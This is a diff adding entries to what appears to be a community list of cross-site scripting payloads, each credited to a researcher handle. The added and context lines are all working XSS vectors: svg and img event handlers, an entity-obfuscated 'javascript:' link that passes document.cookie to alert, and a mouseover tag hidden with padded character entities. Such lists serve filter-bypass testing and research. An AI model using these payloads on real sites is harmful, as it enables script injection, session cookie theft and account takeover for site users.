@@ -24,3 +24,6 @@ test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic
 <svg on onload=(alert)(document.domain)> -@zapstiko
 <svg/on%20onload=alert(1)> (working) -@aufzayed
 <img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_mi
+<a/HREF="Javas%26%2399;ript:%0Athrow onerror=al\u0065rt,document.cooki\u0065">Click Here
+
+<logicalhunter/onmouseover=%0aalert%26%230000000096%3b1%26%230000000096%3b>Click Here  
